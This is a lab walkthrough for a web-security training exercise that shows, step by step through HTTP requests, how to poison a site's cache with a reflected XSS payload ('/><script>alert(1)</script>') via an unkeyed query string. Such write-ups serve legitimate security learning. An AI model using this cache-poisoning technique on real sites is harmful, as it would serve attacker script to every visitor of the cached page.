## Web cache poisoning via an unkeyed query string

This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the home page with a response that executes alert(1) in the victim's browser.

Hint :

- If you're struggling, you can use the Pragma: x-get-cache-key header to display the cache key in the response. This applies to some of the other labs as well.

- Although you can't use a query parameter as a cache buster, there is a common request header that will be keyed if present. You can use the Param Miner extension to automatically add a cache buster header to your requests.

## Notes

- Possibility to leave a comment
- X-Cache Header
- X-Cache-Key
- Cache-Control Header
- `X-Cache-Key : /$$`

## Resume

1. Find cached request  
2. Find the cache key value  
3. Exploit the XSS with query string  
4. Store payload on cache
5. Wait for visitor to hit cache

## Solve

The first step is to find a cached request, in this lab the home page has a cached HTTPS response :

```http
GET / HTTP/2
Host: 0a690047037d401880a60384000e00ba.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=qIMjnszXTa9MF0Su96Wlu38GBXGsaT69; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 8163
```

The next step is to find the `X-Cache-Key` value. For this we can add the `Pragma: x-get-cache-key` header to our initial request :

```http
GET / HTTP/2
Host: 0a690047037d401880a60384000e00ba.web-security-academy.net
Pragma: x-get-cache-key
```

And check again the answer :

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache-Key: /$$
X-Cache: hit
Content-Length: 8163
```

This confirms that the query string is not part of the cache key.

The next step is to test which header can be used as a cache buster. We test different values of the `Origin` header :

```http
GET / HTTP/2
Host: 0a690047037d401880a60384000e00ba.web-security-academy.net
Origin: https://cachebuster1.test
```

Then:

```http
GET / HTTP/2
Host: 0a690047037d401880a60384000e00ba.web-security-academy.net
Origin: https://cachebuster2.test
```

We observe different cache behaviour, confirming `Origin` is included in the cache key.

Next we confirm that the query string is reflected in the response :

```http
GET /?test=aaa HTTP/2
Host: 0a690047037d401880a60384000e00ba.web-security-academy.net
Origin: https://cachebuster1.test
```

The value `aaa` is reflected in the response.

This confirms that user input is reflected but not keyed in the cache.

We then verify caching behaviour by removing the query string while keeping the cache-buster:

```http
GET / HTTP/2
Host: 0a690047037d401880a60384000e00ba.web-security-academy.net
Origin: https://cachebuster1.test
```

The previously reflected input is still present in the cached response.

Now we inject the payload :

```http
GET /?cb='/><script>alert(1)</script> HTTP/2
Host: 0a690047037d401880a60384000e00ba.web-security-academy.net
Origin: https://cachebuster1.test
```

We replay the request until we see `X-Cache: hit` and the payload reflected.

Finally, we remove the `Origin` header and replay the poisoned request until the cache is updated.

We confirm exploitation by loading `/` in the browser and observing `alert(1)`.